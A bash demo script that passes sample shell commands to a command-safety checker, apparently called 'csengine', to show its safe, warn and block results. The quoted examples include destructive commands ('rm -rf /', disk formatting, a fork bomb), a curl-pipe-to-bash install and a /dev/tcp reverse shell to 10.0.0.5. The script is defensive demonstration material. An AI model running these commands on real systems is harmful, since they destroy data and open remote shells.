#!/usr/bin/env bash
# Pre-scripted demo commands for the demo video — safe path, warn path, block path.
echo "=== 1. SAFE: everyday command ==="
csengine check "git status"

echo "=== 2. SAFE: ls ==="
csengine check "ls -la"

echo "=== 3. WARN: risky but common ==="
csengine check "chmod -R 777 /var/www"

echo "=== 4. WARN: pipe to shell ==="
csengine check "curl http://example.com/install.sh | bash"

echo "=== 5. BLOCK: root delete ==="
csengine check "rm -rf /"

echo "=== 6. BLOCK: disk format ==="
csengine check "mkfs.ext4 /dev/sda"

echo "=== 7. BLOCK: fork bomb ==="
csengine check ":(){ :|:& };:"

echo "=== 8. BLOCK: reverse shell ==="
csengine check "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"

echo "=== 9. BLOCK: sudo rm -rf / ==="
csengine check "sudo rm -rf /"
